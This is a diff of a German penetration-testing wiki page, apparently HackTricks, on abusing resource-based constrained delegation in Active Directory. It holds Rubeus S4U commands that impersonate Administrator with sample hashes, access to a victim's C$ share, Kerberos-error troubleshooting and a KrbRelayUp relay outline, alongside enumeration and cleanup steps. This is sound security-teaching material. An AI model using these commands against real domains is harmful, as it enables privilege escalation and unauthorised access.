+- Prüfe in Umgebungen mit vielen Trusts **Selective Authentication**, **SID filtering** und, ob Benutzer aus einer fremden Forest über **local admin**-Rechte auf Ressourcenhosts verfügen.
 
 ### Zugriff
 
-Die letzte Befehlszeile führt den **vollständigen S4U-Angriff** aus und injiziert den TGS von Administrator zum Zielhost in den **Arbeitsspeicher**.\
-In diesem Beispiel wurde ein TGS für den **CIFS**-Service von Administrator angefordert, sodass du auf **C$** zugreifen kannst:
+Die letzte Befehlszeile führt den **vollständigen S4U-Angriff** aus und injiziert den **TGS** von Administrator zum Zielhost in den **Arbeitsspeicher**.\
+In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst von Administrator angefordert, daher kannst du auf **C$** zugreifen:
 ```bash
 ls \\victim.domain.local\C$
 ```
-### Verschiedene Service-Tickets missbrauchen
+### Unterschiedliche Service Tickets missbrauchen
 
-Erfahre mehr über die [**hier verfügbaren Service-Tickets**](silver-ticket.md#available-services).
+Erfahre mehr über die [**hier verfügbaren Service Tickets**](silver-ticket.md#available-services).
 
-## Aufzählung, Auditierung und Bereinigung
+## Aufzählung, Auditing und Bereinigung
 
-### Computer mit konfiguriertem RBCD enumerieren
+### Computer mit konfiguriertem RBCD aufzählen
 
-PowerShell (Dekodierung der SD zur Auflösung von SIDs):
+PowerShell (Dekodierung der SD zur Auflösung der SIDs):
 ```powershell
 # List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
 Import-Module ActiveDirectory
@@ -308,15 +310,15 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 ```
 ## Kerberos-Fehler
 
-- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du nur den RC4-Hash angibst. Übergib an Rubeus mindestens den AES256-Hash (oder einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du nur den RC4-Hash angibst. Übergib Rubeus mindestens den AES256-Hash (oder einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
 - **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** während `-self` für einen normalen Benutzer: Der delegierende Principal hat wahrscheinlich **keinen SPN**. Wiederhole den **letzten Hop** als **`S4U2Self+U2U`** statt als reguläres **`S4U2Self`**.<sup>[[10]](#references)</sup>
-- **`KDC_ERR_ETYPE_NOSUPP`** während **SPN-less RBCD**: Aktuelle DCs können den erzwungenen **RC4-HMAC**-Pfad ablehnen, der für den Trick **`S4U2Self+U2U` + Session-Key-Substitution** erforderlich ist. Versuche stattdessen einen klassischen **SPN-basierten** RBCD-Pfad mit AES.<sup>[[10]](#references)[[15]](#references)</sup>
-- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Zeit des aktuellen Computers von der des DC abweicht und Kerberos nicht ordnungsgemäß funktioniert.
-- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername und die Hashes für die Anmeldung nicht funktionieren. Möglicherweise hast du beim Generieren der Hashes vergessen, das `$` in den Benutzernamen einzufügen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
-- **`KDC_ERR_BADOPTION`**: Dies kann bedeuten:
+- **`KDC_ERR_ETYPE_NOSUPP`** während **SPN-less RBCD**: Aktuelle DCs können den erzwungenen **RC4-HMAC**-Pfad ablehnen, der für den Trick mit **`S4U2Self+U2U`** und Session-Key-Substitution erforderlich ist. Versuche stattdessen einen klassischen **SPN-backed**-RBCD-Pfad mit AES.<sup>[[10]](#references)[[15]](#references)</sup>
+- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und Kerberos nicht ordnungsgemäß funktioniert.
+- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername und die Hashes für die Anmeldung nicht funktionieren. Möglicherweise hast du beim Generieren der Hashes das `$` im Benutzernamen vergessen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
+- **`KDC_ERR_BADOPTION`**: Dies kann Folgendes bedeuten:
 - Der Benutzer, den du impersonieren möchtest, kann nicht auf den gewünschten Service zugreifen (weil du ihn nicht impersonieren kannst oder weil er nicht über ausreichende Berechtigungen verfügt).
 - Der angeforderte Service existiert nicht (wenn du ein Ticket für WinRM anforderst, WinRM aber nicht ausgeführt wird).
-- Der erstellte Fakecomputer hat seine Berechtigungen für den verwundbaren Server verloren, und du musst sie wiederherstellen.
+- Der erstellte Fakecomputer hat seine Berechtigungen über den verwundbaren Server verloren und du musst sie ihm wieder gewähren.
 - Du missbrauchst klassisches KCD; beachte, dass RBCD mit nicht weiterleitbaren S4U2Self-Tickets funktioniert, während KCD weiterleitbare Tickets erfordert.
 
 ## Hinweise, Relays und Alternativen
@@ -328,32 +330,31 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 adws-enumeration.md
 {{#endref}}
 
-- Kerberos-Relay-Ketten enden häufig in RBCD, um in einem Schritt **local SYSTEM** zu erlangen. Siehe praktische End-to-End-Beispiele:
+- Kerberos-Relay-Ketten enden häufig in RBCD, um in einem Schritt lokales SYSTEM zu erreichen. Siehe praktische End-to-End-Beispiele:
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
 
-- Wenn LDAP signing/channel binding **deaktiviert** sind und du ein Machine Account erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP weiterleiten, `msDS-AllowedToActOnBehalfOfOtherIdentity` für deinen Machine Account im Ziel-Computerobjekt setzen und anschließend **Administrator** via S4U von außerhalb des Hosts impersonieren.<sup>[[8]](#references)</sup>
+- Wenn LDAP-Signing/Channel-Binding **deaktiviert** ist und du ein Machine Account erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP relayn, `msDS-AllowedToActOnBehalfOfOtherIdentity` für deinen Machine Account am Zielcomputerobjekt setzen und dich anschließend direkt über S4U von außerhalb des Hosts als **Administrator** impersonieren.<sup>[[8]](#references)</sup>
 
-## Referenzen
+## References
 
-- [1] [Wagging the Dog: Missbrauch von Resource-Based Constrained Delegation zum Angriff auf Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
-- [2] [Ein weiteres Wort zur Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
+- [1] [Den Hund wedeln lassen: Missbrauch von Resource-Based Constrained Delegation zum Angriff auf Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
+- [2] [Noch ein Wort zur Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
 - [3] [Kerberos Resource-based Constrained Delegation: Übernahme eines Computerobjekts](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
-- [4] [Missbrauch von Resource-Based Constrained Delegation](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
-- [5] [Kerberosity Killed the Domain: Ein offensiver Kerberos-Überblick](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+- [4] [Netwrix – Missbrauch von Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
+- [5] [Kerberosity hat die Domain getötet: Ein offensiver Kerberos-Überblick](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 - [6] [Impacket rbcd.py (offiziell)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
 - [7] [Kurzes Linux-Cheatsheet mit aktueller Syntax](https://tldrbins.github.io/rbcd/)
-- [8] [0xdf – HTB Bruno (LDAP signing deaktiviert → Kerberos-Relay zu RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
-- [9] [Synacktiv – Untersuchung von domain- und forest-übergreifendem RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
-- [10] [Synacktiv – Untersuchung von domain- und forest-übergreifendem RBCD: Teil 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
+- [8] [0xdf – HTB Bruno (LDAP-Signing deaktiviert → Kerberos-Relay zu RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
+- [9] [Synacktiv – Untersuchung von domain- und forestübergreifendem RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
+- [10] [Synacktiv – Untersuchung von domain- und forestübergreifendem RBCD: Teil 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
 - [11] [Synacktiv-Impacket-Branch – cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
-- [12] [Microsoft Learn – Überblick über eingeschränkte Kerberos-Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
+- [12] [Microsoft Learn – Überblick über Kerberos Constrained Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
 - [13] [Microsoft Open Specifications – Domainübergreifendes S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
 - [14] [Microsoft Open Specifications – SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
-- [15] [Microsoft Learn – Verwendung von RC4 in Kerberos erkennen und beheben](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
-
-
+- [15] [Microsoft Learn – RC4-Nutzung in Kerberos erkennen und beheben](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
+- [16] [Microsoft Open Specifications – Details zu S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
 {{#include ../../banners/hacktricks-training.md}}
